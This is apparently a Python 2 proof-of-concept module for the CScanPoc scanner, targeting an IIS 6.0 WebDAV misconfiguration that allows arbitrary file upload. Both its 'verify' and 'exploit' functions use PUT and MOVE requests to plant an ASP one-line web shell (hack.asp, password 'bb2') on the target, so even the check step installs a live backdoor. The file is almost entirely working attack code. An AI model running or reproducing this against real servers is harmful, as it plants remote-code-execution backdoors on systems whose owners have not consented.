# coding: utf-8
import requests
import httplib
import urlparse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'IIS_0102' # 平台漏洞编号，留空
    name = 'IIS 6.0 PUT 任意文件创建' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_OPERATION # 漏洞类型
    disclosure_date = '2015-03-03'  # 漏洞公布时间
    desc = '''
    IIS配置不当导致的任意文件创建漏洞。
    ''' # 漏洞描述
    ref = 'http://www.lijiejie.com/python-iis-put-file/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'IIS'  # 漏洞应用名称
    product_version = '6.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c60a890a-f910-41a4-9c4b-ca8fd808b40e' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            verify_url = self.target
            if verify_url.startswith(('http://', 'https://')):
                verify_url = urlparse.urlparse(verify_url).netloc
            conn = httplib.HTTPConnection(verify_url)
            conn.request(method='OPTIONS', url='/')
            headers = dict(conn.getresponse().getheaders())
            if headers.get('server', '').find('Microsoft-IIS') < 0:
                # self.output.info('[-] This is not an IIS web server')
                return
            if 'public' in headers and \
                headers['public'].find('PUT') > 0 and \
                headers['public'].find('MOVE') > 0:
                conn.close()
                conn = httplib.HTTPConnection(verify_url)
                # PUT hack.txt
                conn.request( method='PUT', url='/hack.txt', body='<%execute(request("bb2"))%>' )
                conn.close()
                conn = httplib.HTTPConnection(verify_url)
                # mv hack.txt to hack.asp
                conn.request(method='MOVE', url='/hack.txt', headers={'Destination': '/hack.asp'})
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))
            verify_url = self.target
            if verify_url.startswith(('http://', 'https://')):
                verify_url = urlparse.urlparse(verify_url).netloc
            conn = httplib.HTTPConnection(verify_url)
            conn.request(method='OPTIONS', url='/')
            headers = dict(conn.getresponse().getheaders())
            if headers.get('server', '').find('Microsoft-IIS') < 0:
                # self.output.info('[-] This is not an IIS web server')
                return
            if 'public' in headers and \
                headers['public'].find('PUT') > 0 and \
                headers['public'].find('MOVE') > 0:
                conn.close()
                conn = httplib.HTTPConnection(verify_url)
                # PUT hack.txt
                conn.request( method='PUT', url='/hack.txt', body='<%execute(request("bb2"))%>' )
                conn.close()
                conn = httplib.HTTPConnection(verify_url)
                # mv hack.txt to hack.asp
                conn.request(method='MOVE', url='/hack.txt', headers={'Destination': '/hack.asp'})
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;webshell={webshell},password=bb2'.format(
                            target=self.target, name=self.vuln.name, webshell='%s/hack.txt'% verify_url))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

if __name__ == '__main__':
    Poc().run()